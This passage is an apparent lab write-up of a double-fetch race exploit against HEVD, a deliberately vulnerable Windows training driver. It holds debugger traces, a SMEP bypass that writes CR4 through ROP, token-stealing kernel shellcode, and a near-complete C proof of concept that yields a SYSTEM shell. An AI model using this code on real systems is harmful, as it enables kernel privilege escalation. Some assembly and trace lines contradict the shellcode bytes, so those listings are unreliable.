Connected to Windows 10 14393 x64 target at (Sat May 21 16:06:24.400 2022 (UTC + 1:00)), ptr64 TRUE
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

Unknown bugcheck code (0)
Unknown bugcheck description
Arguments:
Arg1: 0000000000000000
Arg2: 0000000000000000
Arg3: 0000000000000000
Arg4: 0000000000000000

Debugging Details:
------------------

BUGCHECK_CODE:  0
BUGCHECK_P1: 0
BUGCHECK_P2: 0
BUGCHECK_P3: 0
BUGCHECK_P4: 0

PROCESS_NAME:  DoubleFetchPoc.exe
ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
SYMBOL_NAME:  HEVD!TriggerDoubleFetch+136
MODULE_NAME: HEVD
IMAGE_NAME:  HEVD.sys
FAILURE_BUCKET_ID:  ACCESS_VIOLATION_HEVD!TriggerDoubleFetch
FAILURE_ID_HASH:  {d6d20acb-bd59-8959-eb71-904d3e00084e}
Followup:     MachineOwner
```

Now that we know we can invoke an access violation the next goal is overwriting the return address and proving that we can turn this vulnerability into code execution. We'll start by filling the buffer with As and then flipping the size value like we've just done, this will prove that we can gain control of ret. Following that we'll then figure out at what offset we gain control of the instruction pointer. First we'll need to make some modifications to our POC, as shown below.

```C
    SIZE_T  UserBufferSize = 3000;

    /* Initialize USER_DOUBLE_FETCH struct members */
    PtrUserDoubleFetch->Buffer  = UserBuffer;
    PtrUserDoubleFetch->Size    = 1000;

    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);
```

With those changes completed we can simply run the new POC and we should have control of the return address.

```
Windows 10 Kernel Version 14393 MP (1 procs) Free x64
Edition build lab: 14393.2189.amd64fre.rs1_release.180329-1711
Machine Name:
Kernel base = 0xfffff801`6a811000 PsLoadedModuleList = 0xfffff801`6ab19140
System Uptime: 0 days 0:00:00.873
KDTARGET: Refreshing KD connection
Access violation - code c0000005 (!!! second chance !!!)
HEVD!TriggerDoubleFetch+0x136:
fffff802`4d6a6952 c3              ret

1: kd> k
 # Child-SP          RetAddr               Call Site
00 ffffbc80`5a3d37b8 41414141`41414141     HEVD!TriggerDoubleFetch+0x136 
01 ffffbc80`5a3d37c0 41414141`41414141     0x41414141`41414141
02 ffffbc80`5a3d37c8 41414141`41414141     0x41414141`41414141
03 ffffbc80`5a3d37d0 41414141`41414141     0x41414141`41414141
04 ffffbc80`5a3d37d8 41414141`41414141     0x41414141`41414141
05 ffffbc80`5a3d37e0 41414141`41414141     0x41414141`41414141
06 ffffbc80`5a3d37e8 41414141`41414141     0x41414141`41414141
07 ffffbc80`5a3d37f0 41414141`41414141     0x41414141`41414141
08 ffffbc80`5a3d37f8 41414141`41414141     0x41414141`41414141
09 ffffbc80`5a3d3800 41414141`41414141     0x41414141`41414141
```

Perfect, we clearly have control. Now we need to work out the correct offset for control of the instruction pointer. In the previous code block we sent 3000 bytes in total and we control the return address at `ffffbc805a3d37b8` and our data is on the stack until `ffffbc805a3d3978` - we can get the difference between these two numbers and then minus that from the size.

```
1: kd> ? ffffbc80`5a3d3978 - ffffbc80`5a3d37b8
Evaluate expression: 448 = 00000000`000001c0
```

After doing the above I realised that I can actually make my life easier by making the initial size value smaller. In the above output our initial size value is `1000` as shown below.

```C
PtrUserDoubleFetch->Size = 1000;
```

But if we actually make this value smaller, say 100 then we don't need to write as far. In the end the offset ended up being at 2056 bytes. The code changes I made are shown below.

```C
/* Function to change the size member of the UserDoubleFetch struct */
DWORD WINAPI ChangeSizeThread(LPVOID Size)
{
    BOOL ExploitSuccess;
    int i = 0;

    printf("[+] Changing size on processor %d\n", GetCurrentProcessorNumber());

    while (!ExploitSuccess)
    {
        *(PULONG)Size ^= 0x00000808; // 2056
    }
    
    return EXIT_SUCCESS;
}

    /* Initialize USER_DOUBLE_FETCH struct members */
    PtrUserDoubleFetch->Buffer  = UserBuffer;
    PtrUserDoubleFetch->Size    = 100;

    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);
    RtlFillMemory(&UserBuffer[2056], 8, 0x42);
```

If we run the updated POC above we gain exact control of the return address at 2056 bytes, as shown below.

```
Access violation - code c0000005 (!!! second chance !!!)
HEVD!TriggerDoubleFetch+0x136:
fffff807`7b3a6952 c3              ret

1: kd> k
 # Child-SP          RetAddr               Call Site
00 ffff9381`761277b8 42424242`42424242     HEVD!TriggerDoubleFetch+0x136 
01 ffff9381`761277c0 00000000`00000000     0x42424242`42424242
```

Now that we've got exact control of the return address we can begin building our final payload. However, if you read last post you'll know that we need to bypass SMEP in order to get execution. We can do this very easily using a simple ROP chain.

## Bypassing SMEP

I won't cover it again in full detail here but essentially all we need to do is get the kernel base address through `EnumDeviceDrivers` and then move the value `0x70678` into the CR4 register which will disable SMEP. If you'd like more detail on this please refer to my [last post](https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/). Below is the code needed to get the kernel base address and then update the CR4 register.

```C
unsigned long long GetKernelBase(void)
{

    LPVOID  lpImageBase[1024];
    DWORD   lpcbNeeded;

    /* Get base address of first driver (ntoskrnl.exe) */
    printf("[+] Obtaining Driver Base Address!\n");
    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
    if (!DriversBase)
    {
        printf("[!] FATAL: Error enumerating device drivers!\n");
        exit(1);
    }

    /* Get name of first driver (ntoskrnl.exe) */
    char BaseName[1024] = {0};
    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));
    if (!DriversBaseName)
    {
        printf("[!] FATAL: Error getting drivers base name!\n");
        exit(1);
    }

    /* 
     * ntoskrnl.exe is the first module in lpImageBase.
     * typecast LPVOID -> unsigned long long
    */
    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];

    printf("[*] Driver base name is: %s\n", BaseName);
    printf("[*] %s is located at: 0x%p\n", BaseName, KernelBase);

    return KernelBase;

}
```

## Shellcode

Shellcode specifically kernel continuation was definitely the most difficult part of this exploit. Although in theory it should be fairly similar to the continuation we used in the previous post, that was far from being the case. In-fact, this was way more difficult so let me walk you through it. I should note at this point that I actually did not get a working POC on Windows RS1, out of pure frustration I ended up writing POCs for RS1, RS2, RS4 and RS6 and RS4 was the release that I managed to get a SYSTEM shell on. That's not to say it isn't possible to get kernel continuation on those other releases, I just couldn't get it working. If anyone has any insight on this then I'd love to hear it. Let's start by looking at the shellcode which itself is fairly standard, just a typical token stealing payload for RS4.

```
_START:
    push   r8
    push   r9
    push   rax

    mov    r8,QWORD PTR gs:0x188
    mov    DWORD PTR [r8+0x1e4], 0x0
    mov    r9,QWORD PTR [r8+0xb8]
    mov    rax,r9

_LOOP:   
    mov    rcx,QWORD PTR [r9+0x2e0]
    cmp    rcx,0x4
    je     _LOOP
    mov    r9,QWORD PTR [r9+0x2e8]
    sub    r9,0x2e8
    jmp    _LOOP
    mov    rcx,QWORD PTR [r9+0x358]
    and    cl,0xf0
    mov    QWORD PTR [rax+0x358],rcx

    pop    rcx
    pop    r9
    pop    r8

```

As you can see the shellcode is not out of the ordinary and only varies slightly to the shellcode we used in the last post. The part that takes ages here is getting the kernel continuation after executing the shellcode. When we leave the `TriggerDoubleFetch` function in normal code execution we return into the `DoubleFetchIoctlHandler` function and then 0x28 is added to RSP. This behaviour is shown below.

```
0: kd> bp HEVD!TriggerDoubleFetch+136

0: kd> g
Breakpoint 0 hit
HEVD!TriggerDoubleFetch+0x136:
fffff80e`c5aa6952 c3              ret

0: kd> p
HEVD!DoubleFetchIoctlHandler+0x17:
fffff80e`c5aa6817 4883c428        add     rsp,28h

1: kd> p
HEVD!DoubleFetchIoctlHandler+0x1b:
fffff80e`c5aa681b c3              ret

1: kd> p
HEVD!IrpDeviceIoCtlHandler+0x26d:
fffff80e`c5aa52e5 4c8d05e4320000  lea     r8,[HEVD! ?? ::NNGAKEGL::`string' (fffff80e`c5aa85d0)]
```

We can place a breakpoint before the `memcpy` and take a look at the call stack to see what possible return points there are.

```
0: kd> bp HEVD!TriggerDoubleFetch+F5

0: kd> g
Breakpoint 1 hit
HEVD!TriggerDoubleFetch+0xf5:
fffff80e`c5aa6911 e8aaa8f7ff      call    HEVD!memcpy (fffff80e`c5a211c0)

0: kd> k
 # Child-SP          RetAddr               Call Site
00 fffff909`4386ef70 fffff80e`c5aa6817     HEVD!TriggerDoubleFetch+0xf5 [c:\projects\hevd\driver\hevd\doublefetch.c @ 137] 
01 fffff909`4386f7a0 fffff80e`c5aa52e5     HEVD!DoubleFetchIoctlHandler+0x17 [c:\projects\hevd\driver\hevd\doublefetch.c @ 176] 
02 fffff909`4386f7d0 fffff802`dfb18799     HEVD!IrpDeviceIoCtlHandler+0x26d [c:\projects\hevd\driver\hevd\hacksysextremevulnerabledriver.c @ 342] 
03 fffff909`4386f800 fffff802`dffb887b     nt!IofCallDriver+0x59
04 fffff909`4386f840 fffff802`dffbcdea     nt!IopSynchronousServiceTail+0x1ab
05 fffff909`4386f8f0 fffff802`dffba7d6     nt!IopXxxControlFile+0x68a
06 fffff909`4386fa20 fffff802`dfbd6243     nt!NtDeviceIoControlFile+0x56
07 fffff909`4386fa90 00007ffb`0cd6aa84     nt!KiSystemServiceCopyEnd+0x13
08 00000053`fbdffc88 00007ffb`09722766     ntdll!NtDeviceIoControlFile+0x14
09 00000053`fbdffc90 00007ff6`66a79124     0x00007ffb`09722766
0a 00000053`fbdffc98 00000000`00000000     0x00007ff6`66a79124
```

Before we attempt to return to any of these lets run our payload as-is and see what the register layout is like and also how our stack looks after executing our ROP chain to disable SMEP and our shellcode. We can place a breakpoint on `nt!KiSetPageAttributesTable+0xc5` to get to our `pop rcx ; ret` gadget.

```
0: kd> bp nt!KiSetPageAttributesTable+0xc5

0: kd> g
Breakpoint 0 hit
nt!KiSetPageAttributesTable+0xc5:
fffff801`1ab0ebf9 59              pop     rcx

1: kd> p
nt!KiSetPageAttributesTable+0xc6:
fffff801`1ab0ebfa c3              ret

1: kd> 
nt!KeFlushCurrentTbImmediately+0x17:
fffff801`1a7fff37 0f22e1          mov     cr4,rcx

1: kd> 
000001f2`afa60000 4150            push    r8
1: kd> 
000001f2`afa60002 4151            push    r9
1: kd> 
000001f2`afa60004 50              push    rax

[...]

1: kd> 
000001f2`afa60051 59              pop     rcx
1: kd> 
000001f2`afa60052 4159            pop     r9
1: kd> 
000001f2`afa60054 4158            pop     r8

1: kd> k
 # Child-SP          RetAddr               Call Site
00 fffff909`439e07c0 59d28afc`59d28afc     0x0000016e`841b0056
01 fffff909`439e07c8 f211216f`51bc83f5     0x59d28afc`59d28afc
02 fffff909`439e07d0 fa712831`7e520c4b     0xf211216f`51bc83f5
03 fffff909`439e07d8 ffffa6d3`fa71295f     0xfa712831`7e520c4b
04 fffff909`439e07e0 fffff80e`c5aa85d0     0xffffa6d3`fa71295f
05 fffff909`439e07e8 00000000`00222037     HEVD! ?? ::NNGAKEGL::`string'
06 fffff909`439e07f0 00000000`00000002     0x222037
07 fffff909`439e07f8 fffff802`dfb18799     0x2
08 fffff909`439e0800 fffff802`dffb887b     nt!IofCallDriver+0x59
09 fffff909`439e0840 fffff802`dffbcdea     nt!IopSynchronousServiceTail+0x1ab
0a fffff909`439e08f0 fffff802`dffba7d6     nt!IopXxxControlFile+0x68a
0b fffff909`439e0a20 fffff802`dfbd6243     nt!NtDeviceIoControlFile+0x56
0c fffff909`439e0a90 00007ffb`0cd6aa84     nt!KiSystemServiceCopyEnd+0x13
0d 00000004`1d9ffa28 00007ffb`09722766     ntdll!NtDeviceIoControlFile+0x14
0e 00000004`1d9ffa30 00007ff6`48e3a108     0x00007ffb`09722766
0f 00000004`1d9ffa38 00000000`00000000     0x00007ff6`48e3a108

1: kd> r
rax=ffffe4061dad7080 rbx=fffff802dfe93bf9 rcx=fffff909439dff90
rdx=0000086540872a30 rsi=0000000000070678 rdi=fffff802dfb84f37
rip=0000016e841b0056 rsp=fffff909439e07c0 rbp=ffffe4061d8fd6e0
 r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
r11=fffff909439e0790 r12=ffffe4061e001a00 r13=ffffe4061c6d0850
r14=0000016e841b0000 r15=4141414141414141
```

What's pretty obvious here is that our stack is significantly corrupted. Our register state is not in a terrible state, but still needs some fixing. At this point we'll add another function to our shellcode called `KERNEL_RECOVERY` and we'll clean up some stuff following the execution of our shellcode.

```
KERNEL_RECOVERY:
    xor rax, rax
    xor rsi, rsi
    ret
```

It is fairly obvious that we're not going to be able to return to anything such as `HEVD!DoubleFetchIoctlHandler+0x17` or `HEVD!IrpDeviceIoCtlHandler+0x26d` even if we could, we'll be missing the address of the IRP and these will eventually access violate when trying to dereference that address. If you remember from the last post we added 0x40 to RSP which based on the call stack above would return us to `fffff909439e0800` which is `nt!IofCallDriver+0x59`. Let's do the same here and add `0x40` to RSP.

```
1: kd> bp nt!KiSetPageAttributesTable+0xc5

1: kd> g
Breakpoint 0 hit
nt!KiSetPageAttributesTable+0xc5:
fffff801`42881bf9 59              pop     rcx
1: kd> p
nt!KiSetPageAttributesTable+0xc6:
fffff801`42881bfa c3              ret
1: kd> 
nt!KeFlushCurrentTbImmediately+0x17:
fffff801`42572f37 0f22e1          mov     tmm,rcx

1: kd> 
00000270`b9140000 4150            push    r8
1: kd> 
00000270`b9140002 4151            push    r9
1: kd> 
00000270`b9140004 50              push    rax

[...]

1: kd> 
00000270`b9140051 59              pop     rcx
1: kd> 
00000270`b9140052 4159            pop     r9
1: kd> 
00000270`b9140054 4158            pop     r8
1: kd> 
00000270`b9140056 4831c0          xor     rax,rax
1: kd> 
00000270`b9140059 4831f6          xor     rsi,rsi
1: kd> 
00000270`b914005c 4883c440        add     rsp,40h
1: kd> 
00000270`b9140060 c3              ret

1: kd> k
 # Child-SP          RetAddr               Call Site
00 fffffb0e`e55c6800 ffffb780`07006180     0x00000270`b9140060
01 fffffb0e`e55c6808 ffffb780`077dc380     0xffffb780`07006180
02 fffffb0e`e55c6810 00000000`00000001     0xffffb780`077dc380
03 fffffb0e`e55c6818 ffffb780`077dc380     0x1
04 fffffb0e`e55c6820 ffffca00`0008e8c0     0xffffb780`077dc380
05 fffffb0e`e55c6828 fffffb0e`e55c6940     0xffffca00`0008e8c0
06 fffffb0e`e55c6830 ffffb780`077dc380     0xfffffb0e`e55c6940
07 fffffb0e`e55c6838 fffff801`429a687b     0xffffb780`077dc380
08 fffffb0e`e55c6840 fffff801`429aadea     nt!IopSynchronousServiceTail+0x1ab
09 fffffb0e`e55c68f0 fffff801`429a87d6     nt!IopXxxControlFile+0x68a
0a fffffb0e`e55c6a20 fffff801`425c4243     nt!NtDeviceIoControlFile+0x56
0b fffffb0e`e55c6a90 00007ffa`85edaa84     nt!KiSystemServiceCopyEnd+0x13
0c 000000c4`4e1ffb28 00007ffa`82fc2766     ntdll!NtDeviceIoControlFile+0x14
0d 000000c4`4e1ffb30 00007ff7`c34aa108     0x00007ffa`82fc2766
0e 000000c4`4e1ffb38 00000000`00000000     0x00007ff7`c34aa108

1: kd> r
rax=0000000000000000 rbx=fffff80142881bf9 rcx=fffffb0ee55c5f90
rdx=00000761d3bf8ba0 rsi=0000000000000000 rdi=fffff80142572f37
rip=00000270b9140060 rsp=fffffb0ee55c6800 rbp=ffffb78007006180
 r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
r11=fffffb0ee55c6790 r12=ffffb780077dc380 r13=ffffb7800684da20
r14=00000270b9140000 r15=4141414141414141
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
00000270`b9140060 c3              ret

1: kd> p
ffffb780`07006180 06              ???

1: kd> p

*** Fatal System Error: 0x00000050
                       (0xFFFFB78007006180,0x0000000000000011,0xFFFFB78007006180,0x000000000000000C)


nt!DbgBreakPointWithStatus:
fffff801`425bb810 cc              int     3
```

Okay great, an access violation. This frame seems to be corrupted. So what happens if we return to the frame before it at `RSP + 0x38` - lets try.

```
[...]

1: kd> 
000001ba`b7730060 c3              ret

1: kd> 
nt!IofCallDriver+0x59:
fffff801`78cfd799 4883c438        add     rsp,38h
1: kd> 
nt!IofCallDriver+0x5d:
fffff801`78cfd79d c3              ret
1: kd> 
nt!IopSynchronousServiceTail+0x1ab:
fffff801`7919d87b 448bf0          mov     r14d,eax
1: kd> 
nt!IopSynchronousServiceTail+0x1ae:
fffff801`7919d87e 4084f6          test    sil,sil
1: kd> p
nt!IopSynchronousServiceTail+0x1b1:
fffff801`7919d881 7508            jne     nt!IopSynchronousServiceTail+0x1bb (fffff801`7919d88b)
1: kd> 
nt!IopSynchronousServiceTail+0x1b3:
fffff801`7919d883 498bcc          mov     rcx,r12
1: kd> 
nt!IopSynchronousServiceTail+0x1b6:
fffff801`7919d886 e845c5b5ff      call    nt!ObDereferenceObjectDeferDelete (fffff801`78cf9dd0)
1: kd> 
nt!IopSynchronousServiceTail+0x1bb:
fffff801`7919d88b 4c8b642440      mov     r12,qword ptr [rsp+40h]

[...]

1: kd> g
*** Fatal System Error: 0x0000003b
                       (0x00000000C0000005,0xFFFFF80178CF92A6,0xFFFF8F885D9DAD60,0x0000000000000000)

nt!DbgBreakPointWithStatus:
fffff801`78db2810 cc              int     3
```

At last, we have some progress! We still have an access violation but, we did briefly resume execution. Let's check out what caused it to fail.

```
1: kd> 
00000178`eecb005c 4883c438        add     rsp,38h
1: kd> 
00000178`eecb0060 c3              ret

1: kd> 
nt!IofCallDriver+0x59:
fffff803`add13799 4883c438        add     rsp,38h
1: kd> 
nt!IofCallDriver+0x5d:
fffff803`add1379d c3              ret
1: kd> 
nt!IopSynchronousServiceTail+0x1ab:
fffff803`ae1b387b 448bf0          mov     r14d,eax

[...]

1: kd> 
nt!IopSynchronousServiceTail+0x2ea:
fffff803`ae1b39ba 4c8d4c2438      lea     r9,[rsp+38h]
1: kd> 
nt!IopSynchronousServiceTail+0x2ef:
fffff803`ae1b39bf 4c8d442448      lea     r8,[rsp+48h]
1: kd> 
nt!IopSynchronousServiceTail+0x2f4:
fffff803`ae1b39c4 488d542450      lea     rdx,[rsp+50h]
1: kd> 
nt!IopSynchronousServiceTail+0x2f9:
fffff803`ae1b39c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff803`add0edc0)

1: kd> 
*** Fatal System Error: 0x0000003b
                       (0x00000000C0000005,0xFFFFF803ADD0F2A6,0xFFFFF601F0891D60,0x0000000000000000)

nt!DbgBreakPointWithStatus:
fffff803`addc8810 cc              int     3
```

Okay, it looks like we couldn't complete our call at `nt!IopSynchronousServiceTail+0x2f9` which calls into `nt!IopCompleteRequest` and we can see before that call the registers `r9`, `r8` and `rdx` are used. Let's step into the call to `nt!IopCompleteRequest` now and see what happens.

```
1: kd> t
nt!IopSynchronousServiceTail+0x2f9:
fffff801`4afa49c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff801`4aaffdc0)
1: kd> t
nt!IopCompleteRequest:
fffff801`4aaffdc0 4053            push    rbx

[...]

1: kd> 
nt!IopCompleteRequest+0x8e:
fffff801`4aaffe4e 4c8b7308        mov     r14,qword ptr [rbx+8]

[...]

1: kd> 
nt!IopCompleteRequest+0x4e6:
fffff801`4ab002a6 498b06          mov     rax,qword ptr [r14]
1: kd> 

*** Fatal System Error: 0x0000003b
                       (0x00000000C0000005,0xFFFFF8014AB002A6,0xFFFF9C0FCDC8AD60,0x0000000000000000)

nt!DbgBreakPointWithStatus:
fffff801`4abb9810 cc              int     3

CONTEXT:  ffff9c0fcdc8ad60 -- (.cxr 0xffff9c0fcdc8ad60)
rax=00000000abeb090f rbx=fffff8014ae7fbf9 rcx=fffff8014ae7fc71
rdx=ffff9c0fcdc8b890 rsi=ffffbd84ca586ef0 rdi=fffff8014ae7fc09
rip=fffff8014ab002a6 rsp=ffff9c0fcdc8b750 rbp=ffffbd84c9d20800
 r8=ffff9c0fcdc8b888  r9=ffff9c0fcdc8b878 r10=0000000000000000
r11=ffff9c0fcdc8b790 r12=0000000000000000 r13=ffffbd84ca586ef0
r14=a6eb00000003bb92 r15=fffff8014ae55b00
iopl=0         nv up ei ng nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010382

nt!IopCompleteRequest+0x4e6:
fffff801`4ab002a6 498b06          mov     rax,qword ptr [r14] ds:002b:a6eb0000`0003bb92=????????????????

```

Okay perfect, our access violation occurs on this `rax, qword ptr [r14]` instruction and we can see in the above that `r14` gets its value from `rbx + 0x8` so chances are that the address in `rbx + 0x8` has been corrupted, lets add a `mov rbx, r14` into our `KERNEL_RECOVERY` routine in our shellcode and see what happens.

```
[...]

1: kd> 
0000024a`d604005c 4883c438        add     rsp,38h
1: kd> 
0000024a`d6040060 4c89f3          mov     rbx,r14
1: kd> 
0000024a`d6040063 c3              ret

1: kd> 
nt!IofCallDriver+0x59:
fffff803`a5113799 4883c438        add     rsp,38h
1: kd> 
nt!IofCallDriver+0x5d:
fffff803`a511379d c3              ret


1: kd> 
nt!IopSynchronousServiceTail+0x2f9:
fffff803`a55b39c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff803`a510edc0)

[...]

1: kd> 
nt!IopCompleteRequest+0x4de:
fffff803`a510f29e c3              ret


[...]

1: kd> 
nt!IopSynchronousServiceTail+0x2c6:
fffff803`a55b3996 c3              ret

[...]

1: kd> 
nt!NtDeviceIoControlFile+0x5a:
fffff803`a55b57da c3              ret

[...]

1: kd> 
nt!KiSystemServiceExit+0x1f0:
fffff803`a51d143b 660fefdb        pxor    xmm3,xmm3

1: kd> g
```

And as we can see from the above, the fact we didn't get an access violation suggests that fix has worked, and if we wait a while our exploit finishes and see this....

```title="SYSTEM shell :)"
[+] HEVD: Double Fetch
[*] Opening handle to driver!
        [+] Opened Driver Handle: 0x94
[*] Running exploit function!
        [+] Allocated user buffer!
[+] Obtaining Driver Base Address!
[*] Driver base name is: ntoskrnl.exe
[*] ntoskrnl.exe is located at: 0xfffff803a5016000
[+] Shellcode allocated at: 0x0000024ad6040000
        [+] Opened thread for changing size 160
        [+] Set ChangeSizeThread Priority to 15
        [+] Opened thread for IOCTL Control 164
        [+] Set IoControlThread Priority to 15
        [+] Set Affinity Mask for target threads!
[+] Sending IOCTL on processor 1
        [+] Opened thread for changing size 168
        [+] Changing size on processor 0
[!] FATAL: Unable to send IOCTL to driver!
[!] FATAL: Unable to send IOCTL to driver!
[!] FATAL: Unable to send IOCTL to driver!
[!] FATAL: Unable to send IOCTL to driver!
[!] FATAL: Unable to send IOCTL to driver!
        [+] Set ChangeSizeThread Priority to 15
        [+] Opened thread for IOCTL Control 172
        [+] Set IoControlThread Priority to 15
        [+] Set Affinity Mask for target threads!
        [+] Changing size on processor 1
[+] Sending IOCTL on processor 1
Microsoft Windows [Version 10.0.17134.1246]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\admin\Desktop>whoami
nt authority\system
```

Meaning our shellcode did work and we successfully got kernel continuation! I should note that this section does not put into perspective just how long this part took. Shellcoding is my least favourite part of this job (mostly because I am awful at it) but especially when it comes to process continuation. It is extremely frustrating and time consuming - but stick with it. I learned a ton from this!

<hr>

# Fix

In the interest of completeness I thought it would be worthwhile documenting the fix for these vulnerabilities. We can open up the patched HEVD in IDA and take a look at this function again. Below is a *cleaned up and simplified* output from the patched version of HEVD.

```C title="Fixed Code"
TriggerDoubleFetch(*UserDoubleFetch)
{
  char      UserDoubleFetchBuffer;
  size_t    UserDoubleFetchSize;
  char      KernelBuffer[2048];

  memset(KernelBuffer, 0, 2048);
  ProbeForRead(UserDoubleFetch, 0x10, 1);

  UserDoubleFetchBuffer = UserDoubleFetch;
  UserDoubleFetchSize = UserDoubleFetch + 1;
  DbgPrintEx(0x4D, 3, "[+] UserDoubleFetch->Buffer: 0x%p\n", UserDoubleFetchBuffer);
  DbgPrintEx(0x4D, 3, "[+] UserDoubleFetch->Size: 0x%X\n", UserDoubleFetchSize);

  if ( UserDoubleFetchSize <= 0x800 )
  {
    RtlCopyMemory(KernelBuffer, UserDoubleFetchBuffer, UserDoubleFetchSize);
  }

}
```

Focusing only on the important parts, we can see very clearly where the fix is. Instead of doing a fetch for the size check and then a fetch again in the call to `RtlCopyMemory`, the buffer and size values are fetched once before the print statements and those values are used throughout including for the size check and the copy.

<hr>

# Full Exploit

Thanks for reading, I hope you enjoyed! You can find my full proof of concept below.

```C
#include <Windows.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <Psapi.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x222037

/* Structure for the user-mode buffer */
typedef struct _USER_DOUBLE_FETCH
{
    LPVOID  Buffer;
    SIZE_T  Size;
} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;

/* Structure for needed data in IoControlThread function */
typedef struct _IO_THREAD_PARAM
{
    HANDLE              DriverHandle;
    PUSER_DOUBLE_FETCH  DoubleFetch;    // This member is a pointer to the _USER_DOUBLE_FETCH structure
} IO_THREAD_PARAM, *PIO_THREAD_PARAM;

/* Function to open a handle to the driver */
HANDLE OpenDriverHandle(void)
{
    HANDLE DriverHandle = NULL;

    /* Opens handle to driver */
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.
    {
        printf("\t[!] FATAL: Failed to open driver handle!\n");
        exit(-1);
    }
    else
    {
        printf("\t[+] Opened Driver Handle: 0x%x\n", DriverHandle);
        return DriverHandle; // Return handle to driver to be used later.
    }
}

/* Function to check how many processors we have */
int CheckProcessors(void)
{
    SYSTEM_INFO SystemInfo = { 0 };

    /* Check if we have more than 4 processors as attack will take too otherwise */
    GetSystemInfo(&SystemInfo);
    if (SystemInfo.dwNumberOfProcessors < 2)
    {
        printf("[!] FATAL: You don't have enough processors, exiting!\n");
        exit(-1);
    }

    int NumProcessors = SystemInfo.dwNumberOfProcessors;
    return NumProcessors; /* Return number of processors available to be used later. */
}

/* Function to change the size member of the UserDoubleFetch struct */
DWORD WINAPI ChangeSizeThread(LPVOID Size)
{
    BOOL ExploitSuccess;
    int i = 0;

    printf("\t[+] Changing size on processor %d\n", GetCurrentProcessorNumber());

    // Run until we get control of RIP.
    while (!ExploitSuccess)
    {
        *(PULONG)Size ^= 0x00000828; // 2088
    }

    return EXIT_SUCCESS;
}

/* Function to issue IOCTL repeatedly */
DWORD WINAPI IoControlThread(LPVOID IoThreadParam)
{

    BOOL ExploitSuccess;

    PIO_THREAD_PARAM IoControlThreadParam = NULL;
    HANDLE DriverHandle = NULL;
    PUSER_DOUBLE_FETCH UserDoubleFetch = NULL;

    DWORD   BytesReturned = 0;
    int     i = 0;

    printf("[+] Sending IOCTL on processor %d\n", GetCurrentProcessorNumber());

    /* Get pointer to _IO_THREAD_PARAM struct */
    IoControlThreadParam = (PIO_THREAD_PARAM)IoThreadParam;

    /* Get DoubleFetch member from _IO_THREAD_PARAM struct */
    UserDoubleFetch = IoControlThreadParam->DoubleFetch;

    /* Get DriverHandle member from _IO_THREAD_PARAM struct */
    DriverHandle = IoControlThreadParam->DriverHandle;
    printf("%d", DriverHandle);

    /* Run until we get control of RIP. */
    while (!ExploitSuccess)
    {
        EmptyWorkingSet(GetCurrentProcess());

        if (!DeviceIoControl(DriverHandle, IOCTL_CODE, UserDoubleFetch, 3000, NULL, NULL, &BytesReturned, NULL))
        {
            printf("[!] FATAL: Unable to send IOCTL to driver!\n");
        }
    }

    return EXIT_SUCCESS;
}

unsigned long long GetKernelBase(void)
{

    LPVOID  lpImageBase[1024];
    DWORD   lpcbNeeded;

    /* Get base address of first driver (ntoskrnl.exe) */
    printf("[+] Obtaining Driver Base Address!\n");
    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
    if (!DriversBase)
    {
        printf("[!] FATAL: Error enumerating device drivers!\n");
        exit(1);
    }

    /* Get name of first driver (ntoskrnl.exe) */
    char BaseName[1024] = { 0 };
    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));
    if (!DriversBaseName)
    {
        printf("[!] FATAL: Error getting drivers base name!\n");
        exit(1);
    }

    /*
     * ntoskrnl.exe is the first module in lpImageBase.
     * typecast LPVOID -> unsigned long long
    */
    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];

    printf("[*] Driver base name is: %s\n", BaseName);
    printf("[*] %s is located at: 0x%p\n", BaseName, KernelBase);

    return KernelBase;

}

unsigned long long CreateShellcode(void)
{

    char payload[] = "\x41\x50\x41\x51\x50\x65\x4C\x8B\x04\x25\x88\x01\x00\x00\x41\xC7\x80\xE4"
                     "\x01\x00\x00\x00\x00\x00\x00\x4D\x8B\x88\xB8\x00\x00\x00\x4C\x89\xC8\x49"
                     "\x8B\x89\xE0\x02\x00\x00\x48\x83\xF9\x04\x74\x10\x4D\x8B\x89\xE8\x02\x00"
                     "\x00\x49\x81\xE9\xE8\x02\x00\x00\xEB\xE3\x49\x8B\x89\x58\x03\x00\x00\x80"
                     "\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x59\x41\x59\x41\x58\x48\x31\xC0\x48"
                     "\x31\xF6\x48\x83\xC4\x38\x4c\x89\xf3\xC3";


    /* Allocate shellcode in user mode */
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(payload), 0x3000, 0x40);
    if (!shellcode)
    {
        printf("[-] FATAL: Unable to allocate shellcode!\n");
        exit(1);
    }
    printf("[+] Shellcode allocated at: 0x%p\n", shellcode);

    /* Move allocated space in user mode */
    BOOL MoveMem = RtlMoveMemory(shellcode, payload, sizeof(payload));
